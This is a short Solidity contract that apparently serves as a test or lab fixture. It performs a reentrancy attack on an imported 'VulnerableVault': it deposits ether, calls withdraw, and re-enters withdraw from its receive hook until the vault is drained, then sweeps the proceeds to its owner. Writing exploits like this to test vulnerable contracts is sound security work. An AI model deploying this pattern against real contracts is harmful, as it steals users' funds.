// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./VulnerableVault.sol";

contract ReentrancyAttacker {
    VulnerableVault public vault;
    address public owner;
    uint256 public attackAmount;

    constructor(address _vault) {
        vault = VulnerableVault(_vault);
        owner = msg.sender;
    }

    function attack(uint256 amount) external payable {
        attackAmount = amount;
        vault.deposit{value: msg.value}();
        vault.withdraw(amount);
    }

    receive() external payable {
        if (address(vault).balance >= attackAmount) {
            vault.withdraw(attackAmount);
        }
    }

    function sweep() external {
        require(msg.sender == owner, "ONLY_OWNER");
        payable(owner).transfer(address(this).balance);
    }
}
